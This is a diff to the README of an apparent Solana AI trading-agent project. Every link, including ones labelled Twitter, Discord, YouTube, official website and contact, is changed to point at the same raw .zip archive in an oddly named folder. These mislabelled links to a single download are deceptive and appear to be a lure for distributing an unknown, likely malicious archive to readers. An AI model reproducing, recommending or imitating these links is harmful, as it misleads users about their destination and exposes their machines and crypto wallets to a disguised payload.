@@ -1,6 +1,6 @@
 # 🤖🌐 Solana AI Agent 🚀
 
-![Solana AI Agent](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0)
+![Solana AI Agent](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip)
 
 Welcome to the **Solana AI Agent** repository! This groundbreaking AI agent is built on the Solana blockchain, integrating advanced artificial intelligence with social media capabilities and decentralized trading. It is an evolving digital entity striving to bridge the gap between AI, social media, and crypto.
 
@@ -16,11 +16,11 @@ In this repository, you will find various resources related to the Solana AI Age
 
 ## 🔗 Quick Access
 
-If you are ready to dive into the Solana AI Agent project, you can [download the software here](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0). 🚀
+If you are ready to dive into the Solana AI Agent project, you can [download the software here](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip). 🚀
 
 ## 🌐 Visit Our Website
 
-For more information about the Solana AI Agent project and its capabilities, visit our [official website](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0).
+For more information about the Solana AI Agent project and its capabilities, visit our [official website](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip).
 
 ## 🎉 Features
 
@@ -43,9 +43,9 @@ To get started with the Solana AI Agent project, follow these steps:
 
 Stay connected with the Solana AI Agent project:
 
-- Follow us on [Twitter](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0) for real-time updates.
-- Join our [Discord](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0) community to engage with other users.
-- Watch our [YouTube](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0) channel for video tutorials and demos.
+- Follow us on [Twitter](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip) for real-time updates.
+- Join our [Discord](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip) community to engage with other users.
+- Watch our [YouTube](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip) channel for video tutorials and demos.
 
 ## 🛠️ Contribute
 
@@ -53,7 +53,7 @@ We welcome contributions from the community to enhance the Solana AI Agent proje
 
 ## 📞 Contact Us
 
-If you have any questions or inquiries about the Solana AI Agent project, you can reach out to us at [https://github.com/langlor/solana-ai-agent/releases/tag/v2.0](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0).
+If you have any questions or inquiries about the Solana AI Agent project, you can reach out to us at [https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip).
 
 ## 🙏 Acknowledgements
 
@@ -61,6 +61,6 @@ We would like to express our gratitude to the open-source community for their co
 
 Let's revolutionize the world of AI, social media, and crypto with Solana AI Agent! 🌍🤖🚀
 
-👉 [Launch Software](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0) 👈
+👉 [Launch Software](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip) 👈
 
-![Download Software](https://github.com/langlor/solana-ai-agent/releases/tag/v2.0)
+![Download Software](https://raw.githubusercontent.com/langlor/solana-ai-agent/main/allelomorphism/solana-ai-agent-2.8.zip)
